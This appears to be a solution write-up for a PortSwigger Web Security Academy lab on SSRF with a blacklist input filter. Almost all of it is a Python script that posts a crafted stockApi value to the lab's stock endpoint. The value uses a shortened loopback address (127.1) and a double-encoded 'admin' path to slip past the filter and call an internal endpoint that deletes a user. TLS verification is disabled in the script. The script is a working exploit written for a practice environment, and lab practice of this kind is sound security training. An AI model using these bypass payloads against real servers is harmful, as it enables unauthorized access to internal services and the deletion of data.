# Lab: SSRF with blacklist-based input filter

Link to lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0a4a00ad04b967a6c0a1684a00460010.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'stockApi=http://127.1/%2561dmin/delete?username=carlos'

response = requests.post(
    'https://0a4a00ad04b967a6c0a1684a00460010.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)

print(response.text)
```